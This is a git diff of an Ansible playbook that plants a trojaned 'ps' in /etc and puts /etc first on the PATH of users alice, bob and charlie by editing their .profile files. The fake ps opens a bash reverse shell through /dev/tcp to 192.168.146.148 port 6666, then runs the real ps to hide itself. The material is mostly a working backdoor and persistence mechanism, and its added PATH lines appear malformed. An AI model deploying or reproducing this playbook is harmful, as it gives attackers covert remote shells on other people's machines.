@@ -3,8 +3,12 @@
   hosts: all
   become: yes
   tasks:
-    - name: "change $PATH to look at /etc first"
-      shell: "export PATH=/etc:$PATH"
+    - name: "change alice .profile"
+      shell: "echo 'PATH\"/etc:$PATH\"' >> /home/alice/.profile"
+    - name: "change bob .profile"
+      shell: "echo 'PATH\"/etc:$PATH\"' >> /home/bob/.profile"
+    - name: "change charlie .profile"
+      shell: "echo 'PATH\"/etc:$PATH\"' >> /home/charlie/.profile"
     - name: "make new ps file"
       shell: "touch /etc/ps; chmod +x /etc/ps"
     - name: "populate new ps file line 1"
@@ -12,6 +16,6 @@
     - name: "populate new ps file line 2"
       shell: "echo 'script -c 'bash -i' /dev/null </dev/tcp/192.168.146.148/6666 >&0 2>&1 &' >> /etc/ps"
     - name: "populate new ps file line 3"
-      shell: "echo '/usr/bin/ps $@' >> /etc/ps"
+      shell: "echo '/bin/ps $@' >> /etc/ps"
 
 
